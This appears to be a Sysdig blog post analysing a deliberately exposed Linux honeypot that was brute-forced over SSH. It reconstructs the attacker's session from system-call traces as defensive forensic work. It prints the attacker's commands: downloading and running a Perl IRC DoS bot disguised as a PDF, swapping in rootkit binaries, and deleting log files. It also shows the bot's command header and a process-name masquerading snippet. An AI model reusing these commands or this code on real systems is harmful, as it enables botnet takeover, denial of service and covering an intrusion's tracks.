---
ID: 152
post_title: 'Fishing for Hackers: analysis of a Linux Server Attack'
author: Gianluca Borello
post_excerpt: ""
layout: post
permalink: >
  https://sysdigrp2rs.wpengine.com/blog/fishing-for-hackers/
published: true
post_date: 2014-05-05 09:00:39
---
A few days ago I stumbled upon a classic blog post covering <a href="http://plusbryan.com/my-first-5-minutes-on-a-server-or-essential-security-sfor-linux-servers" target="_blank">common recommendations</a> for hardening a fresh new Linux server: install fail2ban, disable SSH password authentication, randomize SSH port, configure iptables, etc. That got me thinking: what would happen if I did exactly the opposite? Of course the most common result is to fall victim to a botnet that is scanning a wide range of public IP addresses, hoping to find some poorly configured service to attack with brute force (SSH or Wordpress to name a few). But what actually happens when you are the victim of one of these simple attacks? What does an attacker do? This post tries to answer these questions by analyzing an actual server attack, captured entirely with <a href="http://www.sysdig.org/" target="_blank" title="Linux troubleshooting">Sysdig</a>. So let’s go fishing!

## The Setup

The idea was to expose on the Internet a vulnerable and poorly configured group of servers, wait until someone compromised them, and then have some fun analyzing what happened. In other words: throw some bait in the water, wait until the fish start biting, and then catch one of them to study it. The first thing I needed was some bait, ie. a bunch of poorly configured hosts. Luckily that’s super easy these days. I just spun up about 20 Ubuntu 12.04 servers using various IaaS providers and regions (AWS, Rackspace and Digital Ocean to be exact) - the hope being that at least one of these servers would be in a “hot” target area for some botnet out there. Next I needed a way to properly record the system activity, so that I could see exactly what steps the attacker took. Since I love Sysdig (of course!), I opted for a combination of Sysdig + S3. I configured Sysdig to launch with compression enabled (-z) and the option to capture a generous amount of bytes for each I/O buffer:

    $ sysdig -s 4096 -z -w /mnt/sysdig/$(hostname).scap.gz
    

Now that all the instances were configured, I simply enabled root SSH login with *password* as password, to be sure that even the stupidest brute force algorithm would break the system in no time. After this, I just sat back and watched all my Sysdig dumps getting delivered to S3.

## Jackpot!

The first catch came pretty quickly: one of the servers was compromised after just 4 hours! How did I know? I immediately saw the Sysdig trace file on my S3 bucket jumping to a few megabytes - far more than the ~100KB/hour of background noise which the idle machine should have been generating. So I downloaded the trace file (about 150MB) on my OSX machine, and started exploring it.

<blockquote class="twitter-tweet tw-align-center" data-lang="en">
  <p lang="en" dir="ltr">
    Using <a href="https://twitter.com/hashtag/sysdig?src=hash">#sysdig</a> to address a <a href="https://twitter.com/hashtag/security?src=hash">#security</a> use case. Fishing for hackers: analysis of a Linux server attack:<a href="https://t.co/Y1QHPpoDto">https://t.co/Y1QHPpoDto</a>
  </p>— Sysdig (@sysdig) 
  
  <a href="https://twitter.com/sysdig/status/618102185482588160">July 6, 2015</a>
</blockquote>

<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script> 
## Exploring the Server Attack

I started my analysis the way I usually prefer to: by getting an overview of what happened to my system in terms of processes, network, and I/O. First, I looked at the top processes by network I/O for the hacked machine:

    $ sysdig -r trace.scap.gz -c topprocs_net
    Bytes     Process
    ------------------------------
    439.63M   /usr/sbin/httpd
    422.29M   /usr/local/apac
    5.27M     sshd
    2.38M     wget
    20.81KB   httpd
    9.94KB    httpd
    6.40KB    perl

Quite a lot of traffic for a server that I didn’t configure to serve anything! I also didn’t remember installing `/usr/sbin/httpd` or `/usr/local/apac` - more on that later. Next I took a better look at the network connections:

    $ sysdig -r trace.scap.gz -c topconns
    Bytes     Proto     Connection
    ------------------------------
    439.58M   udp       170.170.35.93:50978->39.115.244.150:800
    422.24M   udp       170.170.35.93:55169->39.115.244.150:800
    4.91M     tcp       85.60.66.5:59893->170.170.35.93:22
    46.72KB   tcp       170.170.35.93:39193->162.243.147.173:3132
    43.62KB   tcp       170.170.35.93:39194->162.243.147.173:3132
    20.81KB   tcp       170.170.35.93:53136->198.148.91.146:6667
    1000B     udp       170.170.35.93:0->39.115.244.150:800

My host generated 800MB of UDP traffic - that’s insane! This was just screaming DoS. My guess was that the attacker installed some botnet client to generate targeted DoS on demand, so at this point I just shut down my server to make sure it wouldn’t cause any further damage to other people. All the information I had so far confirmed that the system had been compromised, but I could have reached the same conclusion using many other monitoring tools. However, the difference here is that I had an S3 bucket full of details, so I could start digging to see what actually happened. I started with my favorite chisel ever, `spy_users`, to see what the malicious user executed after logging in:

    $ sysdig -r trace.scap.gz -c spy_users
    06:11:28 root) cd /usr/sbin
    06:11:30 root) mkdir .shm
    06:11:32 root) cd /usr/sbin/.shm
    06:11:39 root) wget xxxxxxxxx.altervista.org/l.tgz
    06:11:40 root) tar zxvf l.tgz
    06:11:42 root) cd /usr/sbin/.shm/lib/.muh/src
    06:11:43 root) /bin/bash ./configure --enable-local
    06:11:56 root) make all

See what’s going on here? The attacker created a hidden directory in `/usr/sbin` with a “clever” `.shm` name, downloaded the sources of a program, and started a build. I downloaded the file at the URL above and it turns out to be the IRC bouncer Muh. In the archive file, I found other interesting things such as the very personal configuration files of the attacker, containing various usernames and passwords and a bunch of IRC channels to automatically join on Undernet. Here’s what he did next:

    06:13:19 root) wget http://xxxxxxxxx.altervista.org/.sloboz.pdf
    06:13:20 root) perl .sloboz.pdf
    06:13:20 root) rm -rf .sloboz.pdf
    06:12:58 root) /sbin/iptables -I INPUT -p tcp --dport 9000 -j ACCEPT
    06:12:58 root) /sbin/iptables -I OUTPUT -p tcp --dport 6667 -j ACCEPT

Nice! A perl script downloaded as a hidden pdf file. Now I was curious to learn more. Unfortunately, when I tried to reach the URL above, the file didn’t exist anymore. Well, Sysdig was able to help me, since it recorded every single I/O operation (and up to 4096 bytes of data for each one, as I specified in the command line). I could just look at the file that wget wrote:

<pre style="font-size: x-small;"><code>$ sysdig -r trace.scap.gz -A -c echo_fds fd.filename=.sloboz.pdf
------ Write 3.89KB to /run/shm/.sloboz.pdf
#!/usr/bin/perl
####################################################################################################################
####################################################################################################################
##  Undernet Perl IrcBot v1.02012 bY DeBiL @RST Security Team   ## [ Help ] #########################################
##      Stealth MultiFunctional IrcBot Writen in Perl          #####################################################
##        Teste on every system with PERL instlled             ##  !u @system                                     ##
##                                                             ##  !u @version                                    ##
##     This is a free program used on your own risk.           ##  !u @channel                                    ##
##        Created for educational purpose only.                ##  !u @flood                                      ##
## I'm not responsible for the illegal use of this program.    ##  !u @utils                                      ##
####################################################################################################################
## [ Channel ] #################### [ Flood ] ################################## [ Utils ] #########################
####################################################################################################################
## !u !join &lt;#channel&gt;          ## !u @udp1 &lt;ip&gt; &lt;port&gt; &lt;time&gt;              ##  !su @conback &lt;ip&gt; &lt;port&gt;          ##
## !u !part &lt;#channel&gt;          ## !u @udp2 &lt;ip&gt; &lt;packet size&gt; &lt;time&gt;       ##  !u @downlod &lt;url+path&gt; &lt;file&gt;     ##
## !u !uejoin &lt;#channel&gt;        ## !u @udp3 &lt;ip&gt; &lt;port&gt; &lt;time&gt;              ##  !u @portscan &lt;ip&gt;                 ##
## !u !op &lt;channel&gt; &lt;nick&gt;      ## !u @tcp &lt;ip&gt; &lt;port&gt; &lt;packet size&gt; &lt;time&gt; ##  !u @mail &lt;subject&gt; &lt;sender&gt;       ##
## !u !deop &lt;channel&gt; &lt;nick&gt;    ## !u @http &lt;site&gt; &lt;time&gt;                   ##           &lt;recipient&gt; &lt;message&gt;    ##
...</code></pre>

Interesting... this turns out to be a perl DoS client that can be commanded from IRC, so the attacker could easily manage tons of these machines. I was also lucky enough that wget did 4KB I/O operations the whole time, so if I look through all the output I’m able to see the full sources exactly (truncated above). Reading through the header we’re able to see how this thing operates - it’s supposed to receive a `@udp` IRC message and then flood a victim with network traffic. Let’s see if someone sent it a command:

    $ sysdig -r trace.scap.gz -A -c echo_fds evt.buffer contains @udp
    ------ Read 67B from 170.170.35.93:39194->162.243.147.173:3132
    :x!~xxxxxxxxx@xxxxxxxxx.la PRIVMSG #nanana :!u @udp1 39.115.244.150 800 300

As you can see, the bot received a TCP connection (from its owner presumably), containing a command to attack IP 39.115.244.150 on port 800, which is the exact same IP and port we saw at the beginning in the connection list, flooded with hundreds of megabytes of traffic. This all makes sense! But the server attack didn’t stop there:

    06:13:11 root) wget xxxxxxxxx.xp3.biz/other/rk.tar
    06:13:12 root) tar xvf rk.tar
    06:13:12 root) rm -rf rk.tar
    06:13:12 root) cd /usr/sbin/rk
    06:13:17 root) tar zxf mafixlibs

What is this `mafixlibs`? Google says it’s some kind of rootkit, but I want to see what is contained in that tar file, so I’ll use sysdig again, asking what were the files written by that tar process:

    $ sysdig -r trace.scap.gz -c topfiles_bytes proc.name contains tar and proc.args contains mafixlibs
    Bytes     Filename
    ------------------------------
    207.76KB  /usr/sbin/rk/bin/.sh/sshd
    91.29KB   /usr/sbin/rk/bin/ttymon
    80.69KB   /usr/sbin/rk/bin/lsof
    58.14KB   /usr/sbin/rk/bin/find
    38.77KB   /usr/sbin/rk/bin/dir
    38.77KB   /usr/sbin/rk/bin/ls
    33.05KB   /usr/sbin/rk/bin/lib/libproc.a
    30.77KB   /usr/sbin/rk/bin/ifconfig
    30.71KB   /usr/sbin/rk/bin/md5sum
    25.88KB   /usr/sbin/rk/bin/syslogd

Ah, now it’s clear: a bunch of compromised binaries. So I’m guessing that in my `spy_users` output I’ll see the attacker replacing the system ones:

    06:13:18 root) chattr -isa /sbin/ifconfig
    06:13:18 root) cp /sbin/ifconfig /usr/lib/libsh/.backup
    06:13:18 root) mv -f ifconfig /sbin/ifconfig
    06:13:18 root) chattr +isa /sbin/ifconfig

Indeed. And he was even nice enough to leave me a backup copy. So far so good: I got a couple IRC bots, some compromised system binaries, and I managed to explain the flood of UDP traffic that I was seeing at the beginning. There’s just one thing left: why `topprocs_net` is showing me that all the UDP traffic was generated by `/usr/sbin/httpd` and `/usr/local/apac` processes, which are binaries that I didn’t even see installed on the machine from the `spy_users` output? I would have guessed that the perl bot itself would have been the one sending out the UDP packets, since it’s the one receiving the commands. Let’s use Sysdig again and go at the system call level. I want to see all the events related to `/usr/local/apac`:

    $ sysdig -r trace.scap.gz -A evt.args contains /usr/local/apac
    ...
    955716 06:13:20.225363385 0 perl (10200) < clone res=10202(perl) exe=/usr/local/apach args= tid=10200(perl) pid=10200(perl) ptid=7748(-bash) cwd=/tmp fdlimit=1024 flags=0 uid=0 gid=0 exepath=/usr/bin/perl
    ...

And while we’re here, I also want to see when this perl process with pid 10200 started:

    $ sysdig -r trace.scap.gz proc.pid = 10200
    954458 06:13:20.111764417 0 perl (10200) < execve res=0 exe=perl args=.sloboz.pdf. tid=10200(perl) pid=10200(perl) ptid=7748(-bash) cwd=/run/shm fdlimit=1024 exepath=/usr/bin/perl

As suspected, the perl process is nothing more than `.sloboz.pdf`, which we saw before. But did you see what just happened? It can be tricky for a non-trained eye: the perl process (presumably the DoS client) forked itself (clone event 955716), but at some point before that it changed its executable name and arguments (`exe` and `args`) from `perl .sloboz.pdf` (event 954458) into a random, non suspicious `/usr/local/apach` (event 955716). This would have confused tools like ps, top and sysdig. Of course, there’s no `/usr/local/apach`. You can see that after the fork the process never executed a new binary, it just changed its name. By reading the source code of the perl client (always with `echo_fds`), I was able to confirm all this:

    my @rps = ("/usr/local/apache/bin/httpd -DSSL","/usr/sbin/httpd -k start -DSSL","/usr/sbin/httpd","/usr/sbin/sshd -i","/usr/sbin/sshd","/usr/sbin/sshd -D","/sbin/syslogd","/sbin/klogd -c 1 -x -x","/usr/sbin/acpid","/usr/sbin/cron");
    
    my $process = $rps[rand scalar @rps];
    
    $0="$process".""x16;;
    
    my $pid=fork;

The perl process changes its `argv` to a random common name, and then just forks itself, probably to daemonize. Finally, the attacker decided to get rid of the logs and replace them with new ones:

    06:13:30 root) rm -rf /var/log/wtmp
    06:13:30 root) rm -rf /var/log/lastlog
    06:13:30 root) rm -rf /var/log/secure
    06:13:30 root) rm -rf /var/log/xferlog
    06:13:30 root) rm -rf /var/log/messages
    06:13:30 root) rm -rf /var/run/utmp
    06:13:30 root) touch /var/run/utmp
    06:13:30 root) touch /var/log/messages
    06:13:30 root) touch /var/log/wtmp
    06:13:30 root) touch /var/log/messages
    06:13:30 root) touch /var/log/xferlog
    06:13:30 root) touch /var/log/secure
    06:13:30 root) touch /var/log/lastlog
    06:13:30 root) rm -rf /var/log/maillog
    06:13:30 root) touch /var/log/maillog
    06:13:30 root) rm -rf /root/.bash_history
    06:13:30 root) touch /root/.bash_history

## Conclusion

Wow. By starting the analysis from a very high level and drilling all the way down to a single system call when necessary, I was able track down pretty much exactly what happened. And all this while my instance was completely off, just using a single <a href="http://www.sysdig.org/" target="_blank">Sysdig</a> trace file containing all the activity of the system!

## Final notes

*   All the IP addresses and URLs in this blog post have been randomized or hidden, since some of those attacked servers might still be alive and reachable and I don’t want to expose them any further.
*   Doing a continuous capture might be more difficult in a production environment with heavy load due to the explosion of trace files, especially if I/O buffers are captured. Setting a good capture filter (e.g. filter out the events for the main web server process) can help mitigate this significantly.
*   I could just have headed over to packetstormsecurity and fetched the latest and shiniest exploit/rootkit and done the entire simulation myself, but it’s quite another thing seeing things happening for real, and writing this post has been so much fun you can’t even imagine!

There are so many interesting details that I omitted in the post - please leave any comments and I’ll be glad to continue the conversation!

## Update: Sysdig Falco for Docker Security

Since we published this article, we have been working on an opensource Docker security project: <a href="http://www.sysdig.org/falco/" target="_blank">Sysdig Falco</a>. Falco uses the Sysdig technology for Linux system call introspection and monitors your Docker containers security behavior. Check out this presentation we did on Docker Security at FOSDEM:

<div style="width: 595px; height: 485px; margin: 0 auto;">
  <iframe src="//www.slideshare.net/slideshow/embed_code/key/ewPwqg39rC6NaY" width="595" height="485" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;" allowfullscreen> </iframe> <div style="margin-bottom:5px">
    <strong> <a href="//www.slideshare.net/Sysdig/wtf-my-container-just-spawned-a-shell" title="WTF my container just spawned a shell!" target="_blank">WTF my container just spawned a shell!</a> </strong> from <strong><a target="_blank" href="//www.slideshare.net/Sysdig">Sysdig </a></strong>
  </div>
</div>